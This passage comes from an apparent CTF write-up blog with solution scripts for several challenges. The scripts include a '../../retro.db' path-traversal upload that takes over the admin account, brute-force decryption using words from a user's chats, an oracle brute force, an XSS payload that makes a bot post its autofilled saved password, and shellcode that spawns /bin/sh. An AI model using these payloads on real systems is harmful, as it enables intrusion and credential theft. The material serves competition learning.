</span></span><span class="line"><span class="cl">    <span class="n">c</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s1">&#39;&#39;&#39;CREATE TABLE posts (
</span></span></span><span class="line"><span class="cl"><span class="s1">        id INTEGER PRIMARY KEY AUTOINCREMENT,
</span></span></span><span class="line"><span class="cl"><span class="s1">        user_id INTEGER,
</span></span></span><span class="line"><span class="cl"><span class="s1">        title TEXT,
</span></span></span><span class="line"><span class="cl"><span class="s1">        content TEXT,
</span></span></span><span class="line"><span class="cl"><span class="s1">        FOREIGN KEY (user_id) REFERENCES users(id)
</span></span></span><span class="line"><span class="cl"><span class="s1">    )&#39;&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">c</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s1">&#39;&#39;&#39;CREATE TABLE comments (
</span></span></span><span class="line"><span class="cl"><span class="s1">        id INTEGER PRIMARY KEY AUTOINCREMENT,
</span></span></span><span class="line"><span class="cl"><span class="s1">        post_id INTEGER,
</span></span></span><span class="line"><span class="cl"><span class="s1">        user_id INTEGER,
</span></span></span><span class="line"><span class="cl"><span class="s1">        content TEXT,
</span></span></span><span class="line"><span class="cl"><span class="s1">        FOREIGN KEY (post_id) REFERENCES posts(id),
</span></span></span><span class="line"><span class="cl"><span class="s1">        FOREIGN KEY (user_id) REFERENCES users(id)
</span></span></span><span class="line"><span class="cl"><span class="s1">    )&#39;&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">c</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s1">&#39;&#39;&#39;CREATE TABLE chats (
</span></span></span><span class="line"><span class="cl"><span class="s1">        id INTEGER PRIMARY KEY AUTOINCREMENT,
</span></span></span><span class="line"><span class="cl"><span class="s1">        user1_id INTEGER,
</span></span></span><span class="line"><span class="cl"><span class="s1">        user2_id INTEGER,
</span></span></span><span class="line"><span class="cl"><span class="s1">        FOREIGN KEY (user1_id) REFERENCES users(id),
</span></span></span><span class="line"><span class="cl"><span class="s1">        FOREIGN KEY (user2_id) REFERENCES users(id)
</span></span></span><span class="line"><span class="cl"><span class="s1">    )&#39;&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">c</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s1">&#39;&#39;&#39;CREATE TABLE messages (
</span></span></span><span class="line"><span class="cl"><span class="s1">        id INTEGER PRIMARY KEY AUTOINCREMENT,
</span></span></span><span class="line"><span class="cl"><span class="s1">        chat_id INTEGER,
</span></span></span><span class="line"><span class="cl"><span class="s1">        sender_id INTEGER,
</span></span></span><span class="line"><span class="cl"><span class="s1">        content TEXT,
</span></span></span><span class="line"><span class="cl"><span class="s1">        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
</span></span></span><span class="line"><span class="cl"><span class="s1">        FOREIGN KEY (chat_id) REFERENCES chats(id),
</span></span></span><span class="line"><span class="cl"><span class="s1">        FOREIGN KEY (sender_id) REFERENCES users(id)
</span></span></span><span class="line"><span class="cl"><span class="s1">    )&#39;&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">c</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&#34;INSERT INTO users (username, password, bio, is_admin) VALUES (?, ?, ?, 1)&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">              <span class="p">(</span><span class="s2">&#34;admin&#34;</span><span class="p">,</span> <span class="n">generate_password_hash</span><span class="p">(</span><span class="s2">&#34;admin123&#34;</span><span class="p">),</span> <span class="s2">&#34;Retro overlord&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">conn</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">URL</span><span class="si">}</span><span class="s2">/register&#34;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="p">(</span><span class="n">username</span> <span class="o">:=</span> <span class="n">os</span><span class="o">.</span><span class="n">urandom</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span><span class="o">.</span><span class="n">hex</span><span class="p">()),</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;password&#34;</span><span class="p">:</span> <span class="p">(</span><span class="n">password</span> <span class="o">:=</span> <span class="n">os</span><span class="o">.</span><span class="n">urandom</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span><span class="o">.</span><span class="n">hex</span><span class="p">()),</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;bio&#34;</span><span class="p">:</span> <span class="s2">&#34;hello&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">URL</span><span class="si">}</span><span class="s2">/login&#34;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;password&#34;</span><span class="p">:</span> <span class="n">password</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="n">tempfile</span><span class="o">.</span><span class="n">NamedTemporaryFile</span><span class="p">(</span><span class="s2">&#34;w+b&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">tf</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">tf</span><span class="o">.</span><span class="n">name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">init_db</span><span class="p">(</span><span class="n">tf</span><span class="o">.</span><span class="n">name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">URL</span><span class="si">}</span><span class="s2">/edit_profile&#34;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;bio&#34;</span><span class="p">:</span> <span class="s2">&#34;palle&#34;</span><span class="p">,</span>   
</span></span><span class="line"><span class="cl">    <span class="p">},</span> <span class="n">files</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;profile_pic&#34;</span><span class="p">:</span> <span class="p">(</span><span class="s2">&#34;../../retro.db&#34;</span><span class="p">,</span> <span class="n">tf</span><span class="p">,</span> <span class="s2">&#34;image/jpeg&#34;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="p">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] Uploaded malicious profile picture&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">URL</span><span class="si">}</span><span class="s2">/logout&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">URL</span><span class="si">}</span><span class="s2">/login&#34;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="s2">&#34;admin&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;password&#34;</span><span class="p">:</span> <span class="s2">&#34;admin123&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get_dict</span><span class="p">())</span>
</span></span></code></pre></div><h5 id="password-brute-force-script">Password Brute-Force Script<a hidden class="anchor" aria-hidden="true" href="#password-brute-force-script">#</a></h5>
<blockquote>
<p>N.B.: The lists <code>d</code> and <code>n</code> contained words and dates found in Josh‚Äôs chats, which hinted at the password structure.</p>
</blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span><span class="o">,</span> <span class="nn">itertools</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">cryptography.fernet</span> <span class="kn">import</span> <span class="n">Fernet</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives</span> <span class="kn">import</span> <span class="n">hashes</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives.kdf.pbkdf2</span> <span class="kn">import</span> <span class="n">PBKDF2HMAC</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">d</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;20.05.2023&#39;</span><span class="p">,</span> <span class="s1">&#39;14.03.2001&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">n</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;pixel&#39;</span><span class="p">,</span> <span class="s1">&#39;wigglepuff&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">i</span> <span class="o">=</span> <span class="n">n</span> <span class="o">+</span> <span class="n">d</span>
</span></span><span class="line"><span class="cl"><span class="n">l</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">itertools</span><span class="o">.</span><span class="n">permutations</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">perm</span> <span class="ow">in</span> <span class="n">l</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">password</span> <span class="o">=</span> <span class="s2">&#34;.&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">perm</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">salt</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;whatever&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">kdf</span> <span class="o">=</span> <span class="n">PBKDF2HMAC</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="n">algorithm</span><span class="o">=</span><span class="n">hashes</span><span class="o">.</span><span class="n">SHA256</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">        <span class="n">length</span><span class="o">=</span><span class="mi">32</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">salt</span><span class="o">=</span><span class="n">salt</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">iterations</span><span class="o">=</span><span class="mi">390000</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">urlsafe_b64encode</span><span class="p">(</span><span class="n">kdf</span><span class="o">.</span><span class="n">derive</span><span class="p">(</span><span class="n">password</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">f</span> <span class="o">=</span> <span class="n">Fernet</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;flag.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;rb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">fh</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">token</span> <span class="o">=</span> <span class="n">fh</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">plaintext</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Password found: </span><span class="si">{</span><span class="n">password</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">plaintext</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">continue</span>
</span></span></code></pre></div><p>This combination of exploits and analysis led to the successful decryption of the flag and completion of the challenge.</p>
<h3 id="not-wordle">Not wordle<a hidden class="anchor" aria-hidden="true" href="#not-wordle">#</a></h3>
<h4 id="analysis-2">Analysis<a hidden class="anchor" aria-hidden="true" href="#analysis-2">#</a></h4>
<p>This challenge was a Node.js Wordle-like platform where you could guess some random words (all of them were exactly 5 characters).</p>
<p>However, the challenge provided a switch for &ldquo;random&rdquo;/&ldquo;daily&rdquo; words. The second one, especially, used a special code <code>wotd</code>. After analyzing the backend source for a while I found this little snippet that implemented the logic for word generation.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">getSecret</span><span class="p">(</span><span class="nx">mode</span><span class="p">,</span> <span class="nx">cookies</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">m</span> <span class="o">=</span> <span class="p">(</span><span class="nx">mode</span> <span class="o">||</span> <span class="nx">cookies</span><span class="p">.</span><span class="nx">mode</span> <span class="o">||</span> <span class="s1">&#39;random&#39;</span><span class="p">).</span><span class="nx">toLowerCase</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">m</span> <span class="o">===</span> <span class="s1">&#39;wotd&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">flag</span> <span class="o">=</span> <span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">FLAG</span> <span class="o">||</span> <span class="s1">&#39;REAL_FLAG_ON_REMOTE&#39;</span><span class="p">).</span><span class="nx">toLowerCase</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">{</span> <span class="nx">mode</span><span class="o">:</span> <span class="s1">&#39;wotd&#39;</span><span class="p">,</span> <span class="nx">secret</span><span class="o">:</span> <span class="nx">flag</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">secret</span> <span class="o">=</span> <span class="nx">cookies</span><span class="p">.</span><span class="nx">randomSecret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">secret</span> <span class="o">||</span> <span class="o">!</span><span class="sr">/^[a-z]{5}$/</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">secret</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">secret</span> <span class="o">=</span> <span class="nx">pickRandomWord</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">{</span> <span class="nx">mode</span><span class="o">:</span> <span class="s1">&#39;random&#39;</span><span class="p">,</span> <span class="nx">secret</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Here it&rsquo;s clear that the flag was the daily word on the platform, and basically all we had to do was find it.</p>
<h4 id="solution-2">Solution<a hidden class="anchor" aria-hidden="true" href="#solution-2">#</a></h4>
<p>Since the challenge didn&rsquo;t store any counter for how many times a user tried to guess, it was trivial to find the flag by brute force.</p>
<p>Nevertheless, the challenge didn&rsquo;t even check the length of the guess, so it was also possible to brute-force the word character-by-character using the alphabet <code>0123456789abcdefCTF{}</code>.</p>
<h4 id="script-1">Script<a hidden class="anchor" aria-hidden="true" href="#script-1">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span><span class="o">,</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">URL</span> <span class="o">=</span> <span class="s2">&#34;http://a733fa9b.ctf.ac.upt.ro&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">LENGTH</span> <span class="o">=</span> <span class="mi">69</span>
</span></span><span class="line"><span class="cl"><span class="n">CHARSET</span> <span class="o">=</span> <span class="s1">&#39;CTF</span><span class="si">{}</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">hexdigits</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="s2">&#34;/api/start?mode=wotd&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">LENGTH</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">CHARSET</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="s2">&#34;/api/check&#34;</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;guess&#34;</span><span class="p">:</span> <span class="n">flag</span> <span class="o">+</span> <span class="n">c</span><span class="p">})</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">r</span><span class="p">[</span><span class="s1">&#39;feedback&#39;</span><span class="p">][</span><span class="n">i</span><span class="p">][</span><span class="s2">&#34;status&#34;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;correct&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">flag</span> <span class="o">+=</span> <span class="n">c</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;FLAG:&#34;</span><span class="p">,</span> <span class="n">flag</span><span class="p">)</span>
</span></span></code></pre></div><h3 id="lolchat2">lolchat2<a hidden class="anchor" aria-hidden="true" href="#lolchat2">#</a></h3>
<h4 id="analysis-3">Analysis<a hidden class="anchor" aria-hidden="true" href="#analysis-3">#</a></h4>
<p>This challenge was a sequel to the original <code>lolchat</code>, which we didn&rsquo;t solve during the qualifiers round.
It provided a room-based chat developed using WebSockets in a <strong>black-boxed environment</strong>, we didn&rsquo;t have access to the backend source code, so several assumptions had to be made.</p>
<p>As in the original challenge, the first three rooms didn&rsquo;t respond to our messages. However, in the <code>party</code> and <code>game</code> chat rooms, there were some users exchanging random messages.</p>
<p>The most interesting one was the <code>game</code> room, where the user <code>tom</code> repeatedly sent the same messages, asking for help finding his <strong>password</strong> (the flag). The most notable messages included:</p>
<ul>
<li>&ldquo;i think i had a password saved in my browser&rdquo;</li>
<li>&ldquo;it would usually fill it out for me&rdquo;</li>
</ul>
<p><img alt="challenge game room&rsquo;s screenshot" loading="lazy" src="/images/lolchat2.png"></p>
<h4 id="solution-3">Solution<a hidden class="anchor" aria-hidden="true" href="#solution-3">#</a></h4>
<p>After some quick observations, it became clear that the platform was heavily vulnerable to <strong>XSS (Cross-Site Scripting)</strong>, the only actual validation was <strong>client-side</strong>, applied only when <em>sending</em> messages, not when <em>receiving</em> them.</p>
<p>Initially, we tried redirecting the bot to our webhook, but this didn&rsquo;t work, it was likely restricted to its localhost network. We then hypothesized that the best approach would be to make the bot <strong>send a message</strong> to the chat containing sensitive data using our injected script, and this time, it <strong>worked</strong>.</p>
<p>Ultimately, we realized we could make the bot <strong>autofill</strong> a password input field (using its saved credentials) and <strong>send</strong> the value directly to the chat for everyone to see.</p>
<h4 id="script-2">Script<a hidden class="anchor" aria-hidden="true" href="#script-2">#</a></h4>
<p>Below is the HTML code we used to solve the challenge. It relied on the assumption that the bot&rsquo;s browser would automatically fill in the password input, triggering the <code>oninput</code> event, which then sent the message to the <code>game</code> chat room.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">form</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;password&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;password&#34;</span> <span class="na">autocomplete</span> <span class="na">oninput</span><span class="o">=</span><span class="s">&#34;window.socket.emit(&#39;sendMessage&#39;, { room: &#39;game&#39;, message: document.getElementsByName(&#39;password&#39;)[0].value });&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</span></span></code></pre></div><h2 id="binary-exploitation-">Binary exploitation üè¥‚Äç‚ò†Ô∏è<a hidden class="anchor" aria-hidden="true" href="#binary-exploitation-">#</a></h2>
<h3 id="baby-ikea">baby-ikea<a hidden class="anchor" aria-hidden="true" href="#baby-ikea">#</a></h3>
<h4 id="analysis-4">Analysis<a hidden class="anchor" aria-hidden="true" href="#analysis-4">#</a></h4>
<p>The challenge provided the possibility to connect using netcat to the server and send some data.
Reading the errors that the service was responding with, it was clear that you were only allowed to send base64-encoded data.</p>
<p>I tried some random instructions in assembly and I found out that it was a 32-bit architecture and it would run arbitrary asm code.</p>
<h4 id="solution-4">Solution<a hidden class="anchor" aria-hidden="true" href="#solution-4">#</a></h4>
<p>The solution involved writing a complete asm script in the correct structure and making it do whatever you wanted. I decided to make it spawn a shell, then base64-encode the script and send it to the server.</p>
<h4 id="script-3">Script<a hidden class="anchor" aria-hidden="true" href="#script-3">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;?&#39;</span><span class="p">,</span> <span class="err">?</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## Calls execve(&#39;/bin/sh&#39;) and spawns a shell</span>
</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">section .data
</span></span></span><span class="line"><span class="cl"><span class="s2">    path    db &#39;/bin/sh&#39;, 0         
</span></span></span><span class="line"><span class="cl"><span class="s2">    envp    dd 0                    
</span></span></span><span class="line"><span class="cl"><span class="s2">section .text
</span></span></span><span class="line"><span class="cl"><span class="s2">    global _start
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">_start:
</span></span></span><span class="line"><span class="cl"><span class="s2">    mov eax, 11          ; syscall number for execve
</span></span></span><span class="line"><span class="cl"><span class="s2">    mov ebx, path        ; filename pointer
</span></span></span><span class="line"><span class="cl"><span class="s2">    mov edx, envp        ; envp pointer
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">    int 0x80             ; call kernel
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">    mov eax, 1
</span></span></span><span class="line"><span class="cl"><span class="s2">    xor ebx, ebx
</span></span></span><span class="line"><span class="cl"><span class="s2">    int 0x80
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">shellcode</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></div><h3 id="tetrastack">Tetrastack<a hidden class="anchor" aria-hidden="true" href="#tetrastack">#</a></h3>
<h4 id="analysis-5">Analysis<a hidden class="anchor" aria-hidden="true" href="#analysis-5">#</a></h4>
<p>Tetrastack is a service that lets us play Tetris.</p>
<p>By analyzing the different menu entries, we can see there is an option to save our name, but only after the game is over.
The decompiled function <code>set_name</code> is the following:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="kr">__cdecl</span> <span class="nf">set_name</span><span class="p">(</span><span class="n">Player</span> <span class="o">*</span><span class="n">p</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">size_t</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// rax
</span></span></span><span class="line"><span class="cl">  <span class="kt">signed</span> <span class="kr">__int64</span> <span class="n">got</span><span class="p">;</span> <span class="c1">// [rsp+20h] [rbp-10h]
</span></span></span><span class="line"><span class="cl">  <span class="kt">signed</span> <span class="kr">__int64</span> <span class="n">n</span><span class="p">;</span> <span class="c1">// [rsp+28h] [rbp-8h]
</span></span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">board</span><span class="o">-&gt;</span><span class="n">game_over</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">Enter display name length:&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">n</span> <span class="o">=</span> <span class="nf">read_long</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">n</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Enter display name bytes:&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">got</span> <span class="o">=</span> <span class="nf">read_n</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="o">*</span><span class="p">)</span><span class="n">p</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span> <span class="n">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">...</span>
</span></span></code></pre></div><p>As we can see, there is a vulnerability in how the name length is read. The length has a lower bound check (n &gt; 0) but no upper bound (n &lt; 64), so we can send something like 255 to perform a buffer overflow.</p>
<p>To actually get something out of the overflow, we need to understand where <code>player-&gt;name</code> is in memory and what is positioned after it.</p>
<p>Our answer lies in the <code>main</code> function:</p>
